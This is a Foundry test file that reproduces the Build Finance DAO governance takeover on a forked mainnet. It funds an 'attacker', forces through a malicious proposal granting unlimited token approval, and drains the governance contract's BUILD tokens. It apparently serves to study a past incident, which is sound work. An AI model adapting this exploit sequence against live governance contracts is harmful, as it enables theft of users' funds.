// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";

import {IERC20} from "src/interfaces/IERC20.sol";

interface IBuildFinance {

    function propose(address _target, uint256 _value, bytes memory _data) external returns (uint256);

    function vote(uint256 _proposalId, bool _support) external;

    function execute(uint256 _proposalId, address _target, uint256 _value, bytes memory _data)
        external
        payable
        returns (bytes memory);

    function mint(address account, uint256 amount) external;

    function proposalCount() external returns (int256);

    function state(uint256 proposalId) external returns (uint256);

}

contract ContractTest is Test {

    IBuildFinance BuildGovernance = IBuildFinance(0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583);
    IERC20 build = IERC20(0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739);

    function setUp() public {
        vm.createSelectFork("mainnet", 14_235_712); // fork mainnet at block 14235712
    }

    function test() public {
        vm.prank(0x562680a4dC50ed2f14d75BF31f494cfE0b8D10a1);
        build.transfer(address(this), 101_529_401_443_281_484_977);
        emit log_named_uint("Befre proposing, BUILD balance of attacker:", build.balanceOf(address(this)));
        build.approve(address(BuildGovernance), type(uint256).max);

        BuildGovernance.propose(
            0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739,
            0,
            hex"095ea7b3000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        );
        emit log_named_uint("After proposing, BUILD balance of attacker:", build.balanceOf(address(this)));
        emit log_named_uint("BUILD balance of BuildGovernance contract:", build.balanceOf(address(BuildGovernance)));
        vm.prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002);
        build.approve(address(BuildGovernance), type(uint256).max);
        build.approve(address(this), type(uint256).max);
        vm.prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002);
        BuildGovernance.vote(8, true);
        emit log_named_int("Proposal count:", BuildGovernance.proposalCount());
        emit log_named_uint("Proposal state:", BuildGovernance.state(8));

        vm.warp(1_655_436_437);
        emit log_named_uint("After 2 days, Proposal state:", BuildGovernance.state(8));
        BuildGovernance.execute(
            8,
            0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739,
            0,
            hex"095ea7b3000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        );

        vm.prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002);
        build.transferFrom(address(BuildGovernance), address(this), build.balanceOf(address(BuildGovernance)));
        emit log_named_uint("After exploiting, BUILD balance of attacker:", build.balanceOf(address(this)));
    }

}